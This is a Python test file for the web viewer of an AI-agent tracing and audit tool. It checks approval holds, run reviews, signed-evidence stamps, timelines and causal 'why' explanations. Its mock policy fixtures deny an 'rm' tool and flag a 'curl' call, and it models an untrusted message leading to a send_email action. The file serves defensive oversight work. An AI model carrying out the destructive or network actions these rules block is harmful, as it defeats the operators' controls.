    def test_every_decision_but_a_plain_allow_with_its_outcome_and_who_answered(self):
        """The dev viewer has no approvals page and run reviews listed approvals for 17 of 250 runs with holds."""
        needs_node(self)
        recs = [{**hold(1, "c1"), "v2": {"decision": "deny"}}, {**hold(2, "c2"), "v2": {"decision": "flag"}},
                {"event": "PostToolUse", "session_id": "r1", "tool_use_id": "c2", "tk_seq": 3},
                hold(4, "c3"), answer(5, "c3", "requested", approval_id="apr-3"),
                answer(6, "c3", "approve", approver="oidc:alice"), answer(7, "c3", "consumed"),
                {"event": "PostToolUse", "session_id": "r1", "tool_use_id": "c3", "tk_seq": 8},
                hold(9, "c4"), answer(10, "c4", "reject", approver="uid:501"), hold(11, "c5"), answer(12, "c5", "expired"),
                hold(13, "c6"), answer(14, "c6", "requested", approval_id="apr-6"),
                {**hold(15, "c7"), "v2": {"decision": "allow"}}, {**hold(16, "c8"), "analysis": True},
                hold(17, "c9", run="r2"), {"event": "SessionEnd", "session_id": "r2", "tk_seq": 18}]
        out = json.loads(page_js(["ANSWER", "permRows"], f"""
            const ALL = {json.dumps(recs)}, LOADED = new Map(), runRows = () => ALL; let scope = null, permKey = [], permList = [];
            const rows = r => r.map(x => [x.rec.tool_use_id, x.tabs.filter(Boolean).join(" "), x.out[1], x.ans?.v2.approver ?? null,
                                          x.req?.v2.approval_id ?? null]);
            const seen = [rows(permRows())];
            scope = "r2"; seen.push(rows(permRows()));
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out[0], [["c9", "all ask expired", "NOT ANSWERED", None, None],
                                  ["c6", "all ask waiting", "WAITING", None, "apr-6"],
                                  ["c5", "all ask expired", "EXPIRED", None, None],
                                  ["c4", "all ask rejected", "REJECTED", "uid:501", None],
                                  ["c3", "all ask approved", "APPROVED · RAN", "oidc:alice", "apr-3"],
                                  ["c2", "all flag", "RAN · FLAGGED", None, None], ["c1", "all deny", "BLOCKED", None, None]])
        self.assertEqual(out[1], [["c9", "all ask expired", "NOT ANSWERED", None, None]])

    def test_a_run_review_counts_every_permission_by_outcome(self):
        """Run reviews listed only approve and reject answers: a hold that expired, was abandoned or got no answer was in
        none. A review is what each snapshot carries of every run, so it counts; the run's rows have each one."""
        alice = {"scheme": "oidc", "subject": "alice", "attested": True}
        req = lambda seq, aid, call: v2rec(seq, "approval.request", {"approval_id": aid, "binding": {"tool_call_id": call}})  # noqa: E731
        recs = [v2rec(1, "policy.decision", {"tool_use_id": "c1", "tool": "rm", "decision": "deny", "rule_ids": ["T-DENY"]}),
                v2rec(2, "policy.decision", {"tool_use_id": "c2", "tool": "ls", "decision": "allow", "rule_ids": []}),
                v2rec(3, "policy.decision", {"tool_use_id": "c3", "tool": "pay", "decision": "ask", "rule_ids": ["T-PAY"]}),
                req(4, "apr-3", "c3"),
                v2rec(5, "approval", {"tool_use_id": "c3", "approval_id": "apr-3", "decision": "approve",
                                      "approver_identity": alice}),
                v2rec(6, "approval.consumed", {"approval_id": "apr-3"}, tool_call_id="c3"),
                v2rec(7, "policy.decision", {"tool_use_id": "c4", "tool": "pay", "decision": "ask", "rule_ids": ["T-PAY"]}),
                req(8, "apr-4", "c4"), v2rec(9, "approval.expired", {"approval_id": "apr-4"}),
                v2rec(10, "policy.decision", {"tool_use_id": "c5", "tool": "curl", "decision": "flag", "rule_ids": ["T-F"]}),
                v2rec(11, "policy.decision", {"tool_use_id": "c6", "tool": "pay", "decision": "ask", "rule_ids": ["T-PAY"]})]
        rep = mock.Mock(integrity="VERIFIED", assurance="dev")
        got = view.review(recs, rep, "verified")
        self.assertEqual(got["permissions"], {"blocked": 1, "approved · ran": 1, "expired": 1, "flagged": 1, "waiting": 1})
        self.assertEqual(len(got["approvals"]), 1)   # the approvals list is as it was
        final = view.review(recs + [v2rec(12, "run.final", {})], rep, "verified")
        self.assertEqual(final["permissions"]["not answered"], 1)
        many = recs + [v2rec(20 + i, "policy.decision", {"tool_use_id": f"d{i}", "tool": "rm", "decision": "deny",
                                                          "rule_ids": ["T-DENY"]}) for i in range(2000)]
        self.assertEqual(view.review(many, rep, "verified")["permissions"]["blocked"], 2001)   # a count, not a list
        self.assertLess(len(json.dumps(view.review(many, rep, "verified")["permissions"])), 200)

    def test_a_run_past_the_live_view_is_read_from_the_store_and_its_permissions_from_its_rows(self):
        """/api/rows and the reviews' permissions were served but the page read neither: a run whose records had left
        the live view showed nothing, in its views or PERMISSIONS."""
        needs_node(self)
        rows = [{**hold(5, "c1"), "v2": {"decision": "deny", "rules": [{"id": "T-DENY", "reason": "rm"}]}}]
        out = json.loads(page_js(["ANSWER", "loadRun", "permRows"], f"""
            const LOADED = new Map(), RUNS = new Map([["r1", {{ verdict: "verified", records: 9, tenant: "default", permissions: {{ blocked: 1 }} }}],
                                                      ["r2", {{ verdict: "failed", records: 4 }}]]);
            const ALL = [], asked = [], seen = [], document = {{ URL: "http://127.0.0.1/" }};
            let DROPPED = 7, scope = "r1", R = null, permKey = [], permList = [], rebuilt = 0, later = [];
            const rebuild = () => rebuilt++, schedule = () => {{}}, setTimeout = f => later.push(f);
            const inScope = r => r.session_id === scope, runRows = () => LOADED.get(scope) || ALL;
            let answer = Promise.resolve({{ rows: {json.dumps(rows)} }}); const getJSON = p => {{ asked.push(p); return answer; }};
            (async () => {{
              loadRun("r1"); loadRun("r1"); await answer; await null;   // asked once; rebuilt with its rows
              seen.push([[...asked], rebuilt, LOADED.get("r1").length, permRows().map(r => [r.rec.tool_use_id, r.out[1]])]);
              loadRun("r2"); DROPPED = 0; LOADED.clear(); loadRun("r1"); seen.push(asked.length);   // failed; nothing left out
              DROPPED = 7; answer = Promise.reject(new Error("503")); loadRun("r1"); await answer.catch(() => {{}}); await null;
              seen.push([LOADED.get("r1"), later.length]); later[0](); seen.push([LOADED.get("r1"), asked.length]);   // asked again 10 s later
              // a run that failed while its rows were on the way: they are not kept
              LOADED.clear(); answer = Promise.resolve({{ rows: {json.dumps(rows)} }}); loadRun("r1");
              RUNS.get("r1").verdict = "failed"; await answer; await null; seen.push(LOADED.has("r1"));
              process.stdout.write(JSON.stringify(seen)); }})();"""))
        self.assertEqual(out, [[["api/rows?tenant=default&run=r1"], 1, 1, [["c1", "BLOCKED"]]], 1, [None, 1], [None, 3], False])

    def test_a_loaded_run_keeps_its_new_rows_and_loses_its_rows_when_it_fails(self):
        """A loaded run's live rows after the load vanished on the next rebuild, and its loaded rows survived a failed
        verification (and a reconnect), shown again by rebuild()."""
        needs_node(self)
        loaded = [{"session_id": "r1", "tk_seq": s, "event": "SESS"} for s in (1, 2, 3)]
        live = [{"session_id": "r1", "tk_seq": 2, "event": "SESS"}, {"session_id": "r1", "tk_seq": 4, "event": "HOLD"},
                {"session_id": "r1", "analysis": True, "event": "tk_alert"}, {"session_id": "r2", "tk_seq": 9, "event": "SESS"}]
        out = json.loads(page_js(["runRows", "rebuild", "accept"], f"""
            const LOADED = new Map([["r1", {json.dumps(loaded)}]]), ALL = {json.dumps(live)}, RUNS = new Map(), got = [], seen = [];
            let scope = "r1", R = null, rpos = 0, tapeShown = 0, V2 = true, DROPPED = 0, MAXREC = 50000;
            const S = {{ tape: [] }}, reset = () => {{ got.length = 0; }}, ingest = r => got.push(r.tk_seq ?? "a"), inScope = r => r.session_id === scope;
            const document = {{ body: {{ classList: {{ add() {{}} }} }} }}, toastOf = () => {{}}, stopRun = () => {{}}, whyChanged = () => {{}};
            rebuild(); seen.push([...got]);   // the loaded rows, then its newer live rows and the viewer's own
            accept({{ session_id: "r1", tenant: undefined, analysis: true, review: {{ verdict: "failed" }} }});
            seen.push([LOADED.has("r1"), [...got]]);   // a failed check takes the loaded rows back too
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [[1, 2, 3, 4, "a"], [False, ["a"]]])
        self.assertIn("if (ALL.length) { if (R) stopRun(true); ALL.length = 0; RUNS.clear(); WD.clear(); LOADED.clear();", PAGE)
        self.assertIn("function permCounts(", PAGE)   # while they load, PERMISSIONS shows the review's counts

    def test_the_view_is_reachable_without_why_logs_and_from_a_link(self):
        needs_node(self)
        self.assertNotIn('"permissions"', re.search(r"const NEEDWHY = new Set\(\[[^\]]*\]\)", PAGE).group(0))
        self.assertEqual(page_js(["PAGES", "centre"], """
            let PAGE = "permissions", RV = "calls", CALLSLOG = false;
            process.stdout.write(PAGES.includes("permissions") + " " + centre());"""), "true permissions")


def page_rec(seq, event, typ, **kw):
    return {"event": event, "session_id": "r1", "tk_seq": seq, "hash": f"sha256:{seq:064x}", "v2": {"type": typ}, **kw}


VERIFIED_REPORT = """tenant default · agent a · final
operator-side view — re-verify with the signed release for evidence

[PASS] keys — 1 record key(s) from 1 key record(s)
[WARN] witness quorum — 0 pinned cosignature(s), 0 required
[PASS] run chain — contiguous from run_seq 0

Integrity: VERIFIED.
"""
FAILED_REPORT = """operator-side view — re-verify with the signed release for evidence

[PASS] manifest — every file is listed with its SHA-256
[FAIL] signatures — 1 record(s) whose signature does not verify
        record 4: bad signature
[FAIL] run chain — broken at run_seq 4

Integrity: FAILED.
"""


class Evidence(unittest.TestCase):
    """EVIDENCE was the run review with the report as one block of text: no record-by-record walk, no stamp."""

    def test_the_walk_checks_and_stamp_are_the_servers_result(self):
        needs_node(self)
        recs = [page_rec(5, "SessionStart", "run.registered"),
                page_rec(6, "PreToolUse", "policy.decision", tool_use_id="c1"),
                page_rec(7, "tk_alert", "approval", title="APPROVED · send_email"),
                page_rec(8, "PostToolUse", "tool.result", tool_use_id="c1"),
                {"event": "tk_alert", "session_id": "r1", "tk_seq": None, "analysis": True, "title": "RUN r1"},
                page_rec(9, "tk_model", "model.exchange")]
        out = json.loads(page_js(["tuid", "WALK_MAX", "evidenceOf"], f"""
            const recs = {json.dumps(recs)}, S = {{ actions: new Map([["r1|c1", {{ tool: "send_email", target: "to a@b", pre: recs[1] }}]]) }};
            const of = r => {{ const e = evidenceOf(r, recs); return [e.ok, e.stamp, e.total, e.rows.map(x => [x.seq, x.what, x.type, x.hash.slice(-2)]),
                                                                   e.checks.map(c => [c.status, c.check, c.detail, c.problems])]; }};
            const many = Array.from({{ length: 2005 }}, (_, i) => ({{ tk_seq: i, event: "tk_note", title: "n" }}));
            const capped = evidenceOf({{ verdict: "verified", records: 2010 }}, many);
            process.stdout.write(JSON.stringify([of({{ verdict: "verified", records: 6, report: {json.dumps(VERIFIED_REPORT)} }}),
                of({{ verdict: "failed", report: {json.dumps(FAILED_REPORT)} }}), of({{ verdict: "pending", report: "No checkpoint covers the run's last record yet." }}),
                of({{ verdict: "error" }}), [capped.rows.length, capped.rows[0].seq, capped.total]]));"""))
        verified, failed, pending, error, capped = out
        self.assertEqual(verified[:3], [True, ["ok", "VERIFIED"], 6])
        self.assertEqual(verified[3], [[5, "run.registered", "run.registered", "05"],
                                       [6, "send_email · to a@b", "policy.decision", "06"],
                                       [7, "APPROVED · send_email", "approval", "07"],
                                       [8, "send_email · result", "tool.result", "08"],
                                       [9, "model.exchange", "model.exchange", "09"]])
        self.assertEqual(verified[4], [["pass", "keys", "1 record key(s) from 1 key record(s)", []],
                                       ["warn", "witness quorum", "0 pinned cosignature(s), 0 required", []],
                                       ["pass", "run chain", "contiguous from run_seq 0", []]])
        self.assertEqual(failed[:2], [False, ["bad", "FAILED · SIGNATURES"]])   # its first FAIL line
        self.assertEqual(failed[4], [["pass", "manifest", "every file is listed with its SHA-256", []],
                                     ["fail", "signatures", "1 record(s) whose signature does not verify",
                                      ["record 4: bad signature"]],
                                     ["fail", "run chain", "broken at run_seq 4", []]])
        self.assertEqual((pending[:2], pending[4]), ([False, ["wait", "PENDING"]], []))
        self.assertEqual(error[:2], [False, ["bad", "NOT CHECKED"]])
        self.assertEqual(capped, [2000, 5, 2010])   # the newest 2,000; the run's count says how many are left out

    def test_the_view_draws_the_walk_stamp_commands_tip_and_review(self):
        needs_node(self)
        recs = [page_rec(5, "SessionStart", "run.registered"), page_rec(6, "tk_note", "input.observed", title="INPUT · task")]
        out = json.loads(page_js(["esc", "cp", "tuid", "WALK_MAX", "evidenceOf", "evidenceView"], f"""
            const S = {{ recs: {json.dumps(recs)}, actions: new Map() }}, RUNS = new Map(), el = {{}}, html = {{}};
            const $ = id => el[id] ??= {{}}, put = (id, h) => {{ html[id] = h; }};
            const runCmds = r => ["tracekit export --v2 --run " + r.id, "tracekit verify " + r.id + ".tkb"], reviewHtml = (r, cmds) => `<REVIEW cmds=${{cmds}}>`;
            let scope = "r1"; const seen = [];
            for (const verdict of ["verified", "failed"]) {{
              RUNS.set("r1", {{ id: "r1", verdict, records: 2, decisions: {{}}, report: {json.dumps(VERIFIED_REPORT)} }});
              evidenceView(); seen.push(html.whyv);
            }}
            scope = null; evidenceView(); seen.push(html.whyv);
            process.stdout.write(JSON.stringify(seen));"""))
        ok, bad, none = out
        self.assertEqual(re.findall(r'<div class="rec( ok)?" data-tkseq="(\d+)"', ok), [(" ok", "5"), (" ok", "6")])
        self.assertIn('<div class="stamp ok">VERIFIED</div>', ok)
        self.assertIn("THE VIEWER'S CHECK, OPERATOR-SIDE: tracekit view exported this run's bundle", ok)
        for text in ("tracekit export --v2 --run r1", "tracekit verify r1.tkb", "<REVIEW cmds=false>",
                     "Download the bundle and check it with tracekit verify from the signed release: that, not this "
                     "page, is the evidence.", "VERIFIER REPORT · AS THE VIEWER PRINTED IT"):
            self.assertIn(text, ok)
        self.assertNotIn("sha256:", re.sub(r'title="[^"]*"', "", ok))   # a short hash, the whole one on hover
        self.assertEqual(re.findall(r'<div class="rec( ok)?"', bad), ["", ""])   # a failed run's walk covers nothing
        self.assertIn('<div class="stamp bad">FAILED</div>', bad)
        self.assertIn("Select a run", none)

    def test_a_runs_later_review_keeps_the_report_it_came_without(self):
        """A growing run's next checkpoint and its findings send the review alone: the report went, and with it the
        EVIDENCE checks."""
        needs_node(self)
        out = page_js(["accept"], """
            let V2 = true, R = null, scope = null, DROPPED = 0, MAXREC = 50000;
            const ALL = [], RUNS = new Map(), document = { body: { classList: { add() {} } } };
            const inScope = () => true, ingest = () => {}, rebuild = () => {}, stopRun = () => {}, toastOf = () => {};
            accept({ session_id: "r1", tenant: "default", analysis: true, review: { verdict: "verified", records: 3 }, text: "[PASS] keys" });
            accept({ session_id: "r1", tenant: "default", analysis: true, event: "tk_run", review: { verdict: "verified", records: 5 } });
            process.stdout.write(RUNS.get("r1").records + " " + RUNS.get("r1").report);""")
        self.assertEqual(out, "5 [PASS] keys")


# a run's calls in each state the TIMELINE draws; `ended` reads the run's session
CALLS_JS = """
    const S = { sessions: new Map([["open", { end: null }], ["done", { end: 9 }]]), actList: [] };
    const ag = { session: "done", name: "coder" }, live = { session: "open", name: "orch" }, ask = { decision: "ask" };
    const call = (tool, o) => ({ tool, target: "", agent: ag, end: null, flags: [], approvals: [], ...o });
    const C = {
      ok: call("Read", { start: 1, end: 2, post: {} }),
      failed: call("Bash", { start: 2, end: 2.5, post: {}, error: true, flags: ["error"] }),
      blocked: call("Bash", { start: 3, denied: true, flags: ["denied"] }),
      flagged: call("WebFetch", { start: 4, end: 5, post: {}, flags: ["flagged"] }),
      approved: call("send_email", { start: 5, end: 7, post: {}, flags: ["held_for_approval"], v2: ask, approvals: [
        { ts: 5.5, v2: { approval: "requested" } }, { ts: 6, v2: { approval: "approve" } }, { ts: 6.9, v2: { approval: "consumed" } }] }),
      rejected: call("send_email", { start: 7, flags: ["held_for_approval"], v2: ask, approvals: [{ ts: 8, v2: { approval: "reject" } }] }),
      waiting: call("Agent", { agent: live, start: 8, flags: ["held_for_approval"], v2: ask, approvals: [{ ts: 8.2, v2: { approval: "requested" } }] }),
      running: call("Read", { agent: live, start: 8.5 }),
      noresult: call("Read", { start: 8.6 }),
    };"""


class Waterfall(unittest.TestCase):
    """TIMELINE showed only one lane per agent: which call waited for a person, and how long, was not drawn."""

    def test_each_call_is_bars_by_its_outcome_and_a_hold_waits_until_its_answer(self):
        needs_node(self)
        out = json.loads(page_js(["ANSWER", "ended", "wfBars"], CALLS_JS + """
            process.stdout.write(JSON.stringify(Object.fromEntries(Object.entries(C).map(([k, a]) => [k, wfBars(a)]))));"""))
        self.assertEqual(out, {
            "ok": [["ok", 1, 2]], "failed": [["deny", 2, 2.5]], "blocked": [["deny", 3, 3]], "flagged": [["flag", 4, 5]],
            "approved": [["wait", 5, 6], ["ok", 6, 7]],          # waited from the decision to the answer, then ran
            "rejected": [["wait", 7, 8], ["deny", 8, 8]],        # refused: never ran
            "waiting": [["wait", 8, None]],                      # still waiting: to the right edge
            "running": [["ok", 8.5, None]], "noresult": [["ok", 8.6, 8.6]]})

    def test_by_call_draws_a_row_per_call_and_by_agent_the_lanes(self):
        needs_node(self)
        out = json.loads(page_js(["esc", "fmtDur", "tickStep", "tickText", "ANSWER", "lastAnswer", "ended", "callState",
                                  "WFMAX", "wfBars", "renderWaterfall"], CALLS_JS + """
            const V2 = true, R = null, fmtT = ts => "t" + ts, label = a => a.name, actMatch = a => !a.hide;
            const el = {}, $ = id => el[id] ??= { style: { setProperty() {} }, clientWidth: 900 }, put = (id, h) => { $(id).html = h; };
            const btn = by => ({ dataset: { wfby: by }, classList: { toggle(c, on) { this.on = on; } } }), btns = [btn("call"), btn("agent")];
            const document = { querySelectorAll: () => btns };
            let PAGE = "run", RV = "waterfall", WFBY = "call", selected = C.flagged, seen = [];
            S.actList = [{ ...C.ok, hide: true }, ...Object.values(C)];
            const look = () => seen.push([el.lanetitle.textContent, el.wfby.hidden, el.lanes.hidden, el.wf.hidden,
              el.lanelegend.hidden, el.wflegend.hidden, btns.map(b => b.classList.on)]);
            renderWaterfall(); look(); seen.push(el.wf.html, el.wflegend.html);
            WFBY = "agent"; renderWaterfall(); look();
            PAGE = "desk"; renderWaterfall(); look();
            PAGE = "run"; WFBY = "call"; S.actList = Array.from({ length: 605 }, (_, i) => ({ ...C.ok, start: i, end: i + 1 }));
            renderWaterfall(); seen.push(el.wf.html, el.wflegend.html);
            S.actList = [{ ...C.ok, hide: true }]; renderWaterfall(); seen.push(el.wf.html);
            process.stdout.write(JSON.stringify(seen));"""))
        by_call, html, legend, by_agent, desk, capped, capped_legend, none = out
        self.assertEqual(by_call, ["TIMELINE · ONE ROW PER CALL", False, True, False, True, False, [True, False]])
        self.assertEqual(by_agent, ["TIMELINE · ONE LANE PER AGENT", False, False, True, False, True, [False, True]])
        self.assertEqual(desk[:6], ["TIMELINE · ONE LANE PER AGENT", True, False, True, False, True])
        # one row per call the filters keep, each opening its call; the selected one marked
        self.assertEqual(re.findall(r'data-wf="(\d+)"', html), [str(i) for i in range(1, 10)])
        self.assertEqual(re.findall(r'class="wfr( on)?" data-wf="(\d+)"', html)[3], (" on", "4"))
        bars = re.findall(r'<rect class="wk-(\w+)" x="([\d.]+)" y="4" width="([\d.]+)"', html)
        self.assertEqual([b[0] for b in bars], ["ok", "deny", "deny", "flag", "wait", "ok", "wait", "deny", "wait", "ok", "ok"])
        self.assertIn('<pattern id="wfhatch"', html)
        _, x, w = bars[8]                                          # the hold still waiting runs to the right edge
        self.assertAlmostEqual(float(x) + float(w), 900 - 340, places=0)
        self.assertIn('title="coder · send_email · REJECTED"', html)
        self.assertIn("<title>waiting for a person · 1s</title><", html)
        self.assertIn("<title>failed · 500 ms</title>", html)
        self.assertIn("<title>rejected</title>", html)
        # the legend names only what the run shows
        self.assertEqual(re.findall(r'class="wk-(\w+)">([^<]+)<', legend),
                         [("ok", "allowed"), ("flag", "flagged"), ("deny", "blocked, refused or failed"),
                          ("wait", "waiting for a person")])
        self.assertEqual(re.findall(r'class="wk-(\w+)">([^<]+)<', capped_legend), [("ok", "allowed")])
        # the newest 600 are drawn, and it says how many are not
        self.assertEqual(len(re.findall(r'data-wf="', capped)), 600)
        self.assertIn('data-wf="5"', capped)
        self.assertNotIn('data-wf="4"', capped)
        self.assertIn("5 earlier calls are not drawn: the newest 600 are.", capped)
        self.assertIn("No call matches the filters.", none)

    def test_a_row_and_the_toggle_are_opened_by_the_pages_click_handlers(self):
        self.assertIn("if (t.dataset.wf) return select(S.actList[+t.dataset.wf]);", PAGE)
        self.assertIn("if (t.dataset.wfby) { WFBY = t.dataset.wfby; return schedule(); }", PAGE)
        self.assertIn("[data-wf][tabindex]", PAGE)   # Enter opens a row reached with Tab


SIGNED ={"evidence": [{"seq": 4, "hash": "sha256:4", "type": "tool.result"}]}


def call(policy, **more):
    return {"type": "action", "agent": "executor", "policy": policy, **SIGNED, **more}


class GraphGrades(unittest.TestCase):
    """GRAPH drew every flow alike: a link between two signed records looked like one an unsigned why log claims, an
    arrow into a call the signer stopped like one into a call that ran, and what a sensor saw leave was not drawn."""

    def test_each_edge_is_graded_by_its_proof(self):
        needs_node(self)
        by = {"in": SIGNED, "cited": {"tracekit": {"run_seq": 2}}, "log": {}, "ran": call({"decision": "allow"}),
              "denied": call({"decision": "deny"}), "rejected": call({"decision": "ask", "approval": {"decision": "reject"}}),
              "expired": call({"decision": "ask", "approval": {"decision": "expired"}}),
              "approved": call({"decision": "ask", "approval": {"decision": "approve"}}), "held": call({"decision": "ask"})}
        edges = [("in", "cited", "observed"), ("in", "log", "observed"), ("log", "ran", "observed"),
                 ("in", "ran", "observed"), ("in", "denied", "observed"), ("log", "rejected", "observed"),
                 ("in", "expired", "observed"), ("in", "approved", "observed"), ("in", "held", "observed"),
                 ("in", "denied", "inferred"), ("in", "ran", "tested"), ("ran", "fx:r1|9", "sensor")]
        out = json.loads(page_js(["ANSWER", "DECIDED", "decided", "signedNode", "edgeGrade"], f"""
            const by = {json.dumps(by)};
            process.stdout.write(JSON.stringify({json.dumps(edges)}.map(([src, dst, evidence]) => edgeGrade({{ src, dst, evidence }}, by))));"""))
        self.assertEqual(out, ["signed", "recorded", "recorded", "signed", "blocked", "blocked", "blocked", "signed",
                               "signed", "inferred", "tested", "observed"])

    def test_a_network_effect_joined_to_a_call_of_this_run_is_a_node_after_it(self):
        needs_node(self)
        out = json.loads(page_js(["whyRef", "netEffects"], """
            const WHY = { calls: { "r1|4": ["w1", "ev:call"], "r2|9": ["w2", "ev:other"] } };
            const S = { effects: new Map(), actions: new Map([["r1|c1", { pre: { session_id: "r1", v2: { run_seq: 4 } } }],
                                                              ["r2|c9", { pre: { session_id: "r2", v2: { run_seq: 9 } } }]]) };
            const fx = (seq, kind, call) => S.effects.set("r1|" + seq, { rec: { tk_seq: seq, v2: { effect: { kind, target: "api.example:443" } } }, call });
            fx(7, "connect", "r1|c1"); fx(8, "net", "r1|c1");                    // a kernel sensor's connect, the egress observer's
            fx(9, "exec", "r1|c1"); fx(10, "connect", null);                     // not a connection; joined to no call
            fx(11, "connect", "r2|c9"); fx(12, "connect", "r1|gone");            // a call of another why run; a call not here
            const by = { "ev:call": { agent: "executor", seq: 5 } };
            process.stdout.write(JSON.stringify(netEffects({ run_id: "w1" }, by).map(n => [n.id, n.type, n.call, n.agent, n.seq, n.label])));"""))
        self.assertEqual(out, [["fx:r1|7", "effect", "ev:call", "executor", 5, "api.example:443"],
                               ["fx:r1|8", "effect", "ev:call", "executor", 5, "api.example:443"]])

    def test_each_edge_title_says_its_grade_and_the_legend_names_only_those_drawn(self):
        needs_node(self)
        d = {"run_id": "w1", "agents": [{"name": "executor"}], "nodes": [
            {"id": "in", "type": "input", "agent": "executor", "seq": 1, "label": "msg", "trust": "untrusted", **SIGNED},
            {"id": "un", "type": "input", "agent": "executor", "seq": 2, "label": "note"},
            {"id": "dec", "type": "decision", "agent": "executor", "seq": 3, "label": "mock", **SIGNED},
            {**call({"decision": "allow"}), "id": "ok", "seq": 4, "label": "fetch"},
            {**call({"decision": "ask", "approval": {"decision": "reject"}}), "id": "no", "seq": 5, "label": "send_email"}],
            "edges": [{"src": "in", "dst": "dec", "kind": "context", "evidence": "observed"},
                      {"src": "un", "dst": "dec", "kind": "context", "evidence": "observed"},
                      {"src": "dec", "dst": "ok", "kind": "invoked", "evidence": "observed"},
                      {"src": "dec", "dst": "no", "kind": "invoked", "evidence": "observed"},
                      {"src": "in", "dst": "no", "kind": "argument", "evidence": "inferred"}]}
        out = json.loads(page_js(["dict", "esc", "plural", "ANSWER", "DECIDED", "decided", "signedNode", "edgeGrade", "GRADE",
                                  "whyRef", "netEffects", "effectHow", "reach", "GTYPE", "GRAPH_MAX", "pct", "graphView"], f"""
            const GV = {{ inferred: false, ruled: false, focus: null, fit: true }}, CSS = {{ escape: s => s }}, got = {{}};
            const el = {{ clientWidth: 900, clientHeight: 600, querySelector: () => null }}, $ = id => id === "gsvg" ? null : (got[id] ??= {{}});
            const WHY = {{ calls: {{ "r1|4": ["w1", "ok"] }} }};
            const S = {{ actions: new Map([["r1|c1", {{ pre: {{ session_id: "r1", v2: {{ run_seq: 4 }} }} }}]]), effects: new Map([["r1|9",
                {{ rec: {{ tk_seq: 31, v2: {{ effect: {{ kind: "connect", target: "api.example:443" }} }} }}, call: "r1|c1", how: "window", status: "explained" }}]]) }};
            graphView(el, {json.dumps(d)});
            process.stdout.write(JSON.stringify([el.innerHTML, got.wvsum.textContent]));"""))
        svg, summary = out
        self.assertEqual([html.unescape(t) for t in re.findall(r"<path [^>]*><title>([^<]*)</title>", svg)], [
            "context · signed: both ends are signed records", "context · recorded flow",
            "invoked · signed: both ends are signed records", "invoked · blocked: its signed decision stopped the call",
            "connect api.example:443 · started while this call ran · observed: a sensor saw it"])
        self.assertEqual(re.findall(r"</svg> ([^<]*)</span>", svg), [
            "signed: both ends are signed records", "recorded flow", "observed: a sensor saw it",
            "blocked: its signed decision stopped the call"])   # no inferred link is drawn, so none is named
        self.assertIn("stroke:var(--cyan)", svg)
        self.assertRegex(svg, r'<g data-tkseq="31"[^>]*>.*>api.example:443</text>')   # the effect opens its record
        self.assertEqual(summary, "5 nodes · 4 of 5 edges (recorded, tested) · 1 network effect a sensor saw")


WHY_RUN = {"run_id": "w1", "path": "/runs/w 1", "replay": {"program": "app:System", "allowed": False}, "nodes": [
    {"id": "ev:task", "type": "input", "agent": "executor", "seq": 1, "label": "task", "evidence": [{"seq": 6}]},
    {"id": "ev:msg", "type": "input", "agent": "executor", "seq": 2, "label": "msg:planner->executor", "trust": "untrusted",
     "evidence": [{"seq": 16}]},
    {"id": "ev:dec", "type": "decision", "agent": "executor", "seq": 3, "label": "mock", "evidence": [{"seq": "3 of run r1"}]},
    {"id": "ev:call", "type": "action", "agent": "executor", "seq": 4, "label": "send_email", "evidence": [{"seq": 27}]}]}
WHY_CALL = {"provenance": [], "target": "tool=send_email", "lineage": [["ev:msg", "ev:dec", "ev:call"],
                                                                      ["ev:task", "ev:dec", "ev:call"]], "candidates": [
    {"node": "ev:msg", "label": "msg:planner->executor", "kind": "input", "trust": "untrusted", "status": "untested",
     "intervention": "input:msg:planner->executor", "test": None, "reuse": 0.3},
    {"node": None, "label": "planner->executor", "kind": "message", "status": "untested",
     "intervention": "channel:planner->executor", "test": None}]}
WHY_TEXT = """Why did executor run send_email?
Not tested yet. 2 inputs and channels reached this action. Start with the untrusted ones.
How it got here:
1. input · executor · task (record 6)
2. input · executor · msg:planner->executor (untrusted) (record 16)
3. model call · executor · mock
4. tool call · executor · send_email (record 27)
run w1"""


class WhyCauses(unittest.TestCase):
    """WHY's verdict and chain could only be read on the page, a candidate cause linked to nothing, and its test's
    command was a template with SPEC to fill in (Causeway U25: a ready command per cause)."""

    def body(self, run):
        return json.loads(page_js(["dict", "esc", "shq", "cp", "WSTATUS", "CHAIN", "pct", "effectBar", "verdict", "lineageHtml",
                                   "WTYPE", "PROV", "recSeq", "whyText", "whyBody"], f"""
            const WTARGET = {{}}, WJOINT = new Set(), WBUSY = null, WMSG = "", d = {json.dumps(run)}, A = {json.dumps(WHY_CALL)};
            process.stdout.write(JSON.stringify([whyText({{ run: "w1", node: "ev:call" }}, d, A), whyBody({{ run: "w1", node: "ev:call" }}, d, A).join("")]));"""))

    def test_the_explanation_is_the_verdict_the_chain_with_its_records_and_the_run(self):
        needs_node(self)
        self.assertEqual(self.body(WHY_RUN)[0], WHY_TEXT)

    def test_each_cause_links_its_node_and_record_and_has_its_ready_command(self):
        needs_node(self)
        page = self.body(WHY_RUN)[1]
        copies = [html.unescape(v) for v in re.findall(r'data-copy="([^"]*)"', page)]
        self.assertEqual(copies, [WHY_TEXT,
                                  "tracekit why test '/runs/w 1' --system 'app:System' --remove "
                                  "'input:msg:planner->executor' --target 'tool=send_email'",
                                  "tracekit why test '/runs/w 1' --system 'app:System' --remove "
                                  "'channel:planner->executor' --target 'tool=send_email'"])
        self.assertIn('title="copy">COPY THIS EXPLANATION</button>', page)
        self.assertIn('<a href="#" data-wopen="ev:msg" data-wr="w1">planner-&gt;executor</a> '
                      '<a href="#" data-tkseq="16">record&nbsp;16</a>', page)
        self.assertEqual(page.count("data-wopen="), 2)   # the call's DETAILS and the input; the channel has no node
        # a run that names no program has no ready command: only the explanation is copied
        nothing = self.body({**WHY_RUN, "replay": {"program": "", "allowed": False}})[1]
        self.assertEqual(len(re.findall(r"data-copy=", nothing)), 1)

    def test_a_copy_button_returns_to_its_own_label(self):
        self.assertIn("const label = b.dataset.label ??= b.textContent;", PAGE)
        self.assertIn('setTimeout(() => { b.textContent = label; }, 1200)', PAGE)


def hz_call(seq, tool, args, run="r1", decision="allow", rules=(), cwd="/home/u/shop"):
    return {"event": "PreToolUse", "session_id": run, "tk_seq": seq, "ts": 1000 + seq, "tool_use_id": f"c{seq}", "tool_name": tool,
            "tool_input": args, "cwd": cwd, "agent": "?", "v2": {"decision": decision, "rules": [{"id": i, "reason": r} for i, r in rules]}}


def why_call(seq, run, ts, **unread):
    """A call as why.server.tape puts a why log's action on the page: its seq counts within its run."""
